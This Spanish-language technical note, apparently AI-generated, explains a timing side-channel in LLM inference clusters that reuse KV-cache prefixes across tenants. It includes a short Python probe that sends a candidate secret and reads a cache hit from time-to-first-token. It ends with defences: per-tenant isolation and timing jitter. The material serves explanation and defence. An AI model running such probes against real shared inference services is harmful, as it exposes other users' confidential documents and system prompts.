---
titulo: "Vulnerabilidad de canal lateral por reutilización de prefijos en KV Cache"
createdBy: gemini
model: gemini-flash-latest
createdAt: 2026-10-04 01:47
tags: ["ciberseguridad", "llm", "sistemas-distribuidos", "side-channel"]
---

En [[PagedAttention optimización de memoria antes del escalado distribuido]] y [[Estrategias de enrutamiento y balanceo de carga en clusters de inferencia de LLM]], una optimización habitual para maximizar el rendimiento consiste en la reutilización de prefijos (*Prefix Caching* o *Radix Attention*). Si varios usuarios envían solicitudes que comparten un contexto inicial idéntico (como un prompt de sistema, un documento corporativo o un historial compartido), el motor de inferencia evita recalcular la atención de esos tokens y reutiliza directamente las páginas de la KV Cache ya residentes en memoria.

Sin embargo, esta optimización para mitigar [[El cuello de botella de la inferencia en LLMs y la necesidad de sistemas distrib]] introduce una superficie de ataque crítica en arquitecturas multi-inquilino (*multi-tenant*): la fuga de información mediante canales laterales de temporización (*Timing Side-Channel Attacks*).

El ataque explota la disparidad en el tiempo hasta la emisión del primer token (*Time To First Token* o TTFT). Cuando un prefijo ya reside en la memoria de la GPU (acierto de caché o *cache hit*), la fase de prellenado (*prefill*) se omite casi por completo, reduciendo el TTFT de cientos de milisegundos a apenas una fracción insignificante. Un atacante puede enviar candidatos de texto estructurado y, midiendo la latencia de respuesta, deducir con alta probabilidad si otros usuarios han consultado previamente documentos confidenciales, historiales médicos o prompts de sistema protegidos.

Demostración conceptual de sondeo de caché mediante medición de TTFT:

```python
import time
import requests

def probe_prefix_cache(api_url: str, candidate_secret: str, threshold_ms: float = 35.0) -> bool:
    """
    Determina si un prefijo confidencial ya fue procesado y retenido en el cluster.
    """
    payload = {
        "prompt": f"Documento confidencial: {candidate_secret}\nResumen:",
        "max_tokens": 1
    }
    
    start_time = time.perf_counter()
    response = requests.post(api_url, json=payload)
    elapsed_ms = (time.perf_counter() - start_time) * 1000
    
    # Un tiempo anormalmente bajo evidencia prefill omitido (hit en KV Cache)
    is_cached = elapsed_ms < threshold_ms
    print(f"TTFT medido: {elapsed_ms:.2f} ms -> {'[CACHE HIT - Dato expuesto]' if is_cached else '[CACHE MISS]'}")
    return is_cached
```

Para defenderse contra este canal lateral sin perder la eficiencia del caching, el cluster debe implementar aislamiento estricto de espacios de nombres por tenant en la tabla de bloques o aplicar normalización temporal artificial (*jitter* / relleno de tiempo constante) antes de devolver el primer token al cliente.
